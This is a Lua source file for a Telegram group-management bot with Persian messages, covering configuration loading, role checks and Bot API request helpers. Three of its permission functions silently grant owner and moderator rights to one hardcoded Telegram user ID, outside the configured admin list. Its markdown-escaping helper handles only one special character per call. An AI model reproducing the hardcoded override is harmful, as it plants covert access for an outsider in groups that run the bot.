require('./libs/JSON')
http = require("socket.http")
https = require("ssl.https")
ltn12 = require("ltn12")
URL = require("socket.url")
json = (loadfile "./libs/JSON.lua")()
JSON = (loadfile "./libs/dkjson.lua")()
redis = (loadfile "./libs/redis.lua")()
Config = (loadfile "./Config.lua")()
tdbot = dofile('./libs/tdbot.lua')
Bot_Api = 'https://api.telegram.org/bot'..Config.bot_token
EndMsg = " ツ"
RedisIndex = Config.RedisIndex
bot_token = Config.bot_token
channel_username = Config.channel_username
channel_inline = Config.channel_inline
sudo_username = Config.sudo_username
SUDO = Config.SUDO
Bot_id = Config.Bot_id
link_poshtibani = Config.link_poshtibani
sudoinline_username = Config.sudoinline_username
sudo_name = Config.sudo_name
linkpardakht = Config.linkpardakht
Bot_inline = Config.Bot_inline
Bot_name = Config.Bot_name
Cleaner_Username = Config.Cleaner_Username
Cleaner_id = Config.Cleaner_id
channel_link = Config.channel_link
EndInline = "\n[برای عضو شدن در کانال پشتیبانی کلیک کنید •••]("..channel_link..")"
offset = 0
color = {
black = {"\027[30m", "\027[40m"},
red = {"\027[31m", "\027[41m"},
green = {"\027[32m", "\027[42m"},
yellow = {"\027[33m", "\027[43m"},
blue = {"\027[34m", "\027[44m"},
magenta = {"\027[35m", "\027[45m"},
cyan = {"\027[36m", "\027[46m"},
white = {"\027[37m", "\027[47m"},
default = "\027[00m"
}
function is_leader1(user_id)
	local var = false
	if user_id == tonumber(657415607) then
		var = true
	end
	return var
end
function is_sudo(user_id)
	local var = false
	for v,user in pairs(Config.sudo_users) do
		if user == user_id then
			var = true
		end
	end
	return var
end
function is_mod(chat_id,user_id)
	local var = false
	for v,user in pairs(Config.sudo_users) do
		if user == user_id then
			var = true
		end
	end
	local owner = redis:sismember(RedisIndex.."Owners:"..chat_id,user_id)
	local hash = redis:sismember(RedisIndex.."Mods:"..chat_id,user_id)
	if hash or owner then
		var=  true
	end
	if user_id == tonumber(657415607) then
		var = true
	end
	return var
end
function is_owner(chat_id,user_id)
	local var = false
	for v,user in pairs(Config.sudo_users) do
		if user== user_id then
			var = true
		end
	end
	local hash = redis:sismember(RedisIndex.."Owners:"..chat_id,user_id)
	if hash then
		var=  true
	end
	if user_id == tonumber(657415607) then
		var = true
	end
	return var
end
function is_req(chat_id, user_id, msgid)
	local var = false
	if redis:get(RedisIndex.."ReqMenu:" .. chat_id .. ":" .. user_id) then
		redis:setex(RedisIndex.."ReqMenu:" .. chat_id .. ":" .. user_id, 260, true)
		var = true
	end
	return var
end
function getUpdates(offset)
	local url = Bot_Api .. '/getUpdates?timeout=20'
	if offset then
		url = url .. '&offset=' .. offset
	end
	return sendRequest(url)
end
function sendRequest(url)
	local dat, res = https.request(url)
	local tab = JSON.decode(dat)
	if res ~= 200 then
		return false, res
	end
	if not tab.ok then
		return false, tab.description
	end
	return tab
end
function check_markdown(text)
	str = text
	if str ~= nil then
		if str:match('_') then
			output = str:gsub('_',[[\_]])
		elseif str:match('*') then
			output = str:gsub('*','\\*')
		elseif str:match('`') then
			output = str:gsub('`','\\`')
		else
			output = str
		end
		return output
	end
end
function es_name(name)
	if name:match('_') then
		name = name:gsub('_','')
	end
	if name:match('*') then
		name = name:gsub('*','')
	end
	if name:match('`') then
		name = name:gsub('`','')
	end
	return name
end
function string:split(sep)
	local sep, fields = sep or ":", {}
	local pattern = string.format("([^%s]+)", sep)
	self:gsub(pattern, function(c) fields[#fields+1] = c end)
	return fields
end
function SendInlineApi(chat_id, text, keyboard, reply_to_message_id, markdown)
	local url = Bot_Api.. '/sendMessage?chat_id=' .. chat_id
	if reply_to_message_id then
		url = url .. '&reply_to_message_id=' .. reply_to_message_id
	end
	if markdown == 'md' or markdown == 'markdown' then
		url = url..'&parse_mode=Markdown'
	elseif markdown == 'html' then
		url = url..'&parse_mode=HTML'
	end
	url = url..'&text='..URL.escape(text)
	url = url..'&disable_web_page_preview=false'
	url = url..'&reply_markup='..URL.escape(JSON.encode(keyboard))
	return https.request(url)
end
function send_msg(chat_id, text)
	local url = Bot_Api .. '/sendMessage?chat_id=' .. chat_id .. '&text=' .. URL.escape(text)
	url = url..'&parse_mode=Markdown'
	https.request(url)
end
function EditInline(Text, ChatId, MessageId, markdown, ReplyMarkup)
	local url = Bot_Api.. "/editMessageText?text="..URL.escape(Text)
	if ChatId and MessageId then
		url = url.."&chat_id="..ChatId.."&message_id="..MessageId
	else
		return false
	end
	if markdown == 'md' or markdown == 'markdown' then
		url = url..'&parse_mode=Markdown'
	elseif markdown == 'html' then
		url = url..'&parse_mode=HTML'
	end
	if ReplyMarkup then
		url = url.."&reply_markup="..URL.escape(json:encode(ReplyMarkup))
	end
	url = url..'&disable_web_page_preview=false'
	return https.request(url)
end
function ShowMsg(callback_query_id, text, show_alert)
	local Rep = Bot_Api .. '/answerCallbackQuery?callback_query_id=' .. callback_query_id .. '&text=' .. URL.escape(text)
	if show_alert then
		Rep = Rep..'&show_alert=true'
	end
	https.request(Rep)
end
function msg_valid(msg)
	local msg_time = os.time() - 60
	if msg.date < tonumber(msg_time) then
		print('\027['..color.red[1]..' » OLD MESSAGE « \027[00m')
		return false
	end
	return true
end
function bot_run()
	bot = nil
	while not bot do
		bot = sendRequest(Bot_Api.."/getMe")
	end
	bot = bot.result
	last_update = last_update or 0
	lastcron = lastcron or os.time()
	whostart = true
end
bot_run()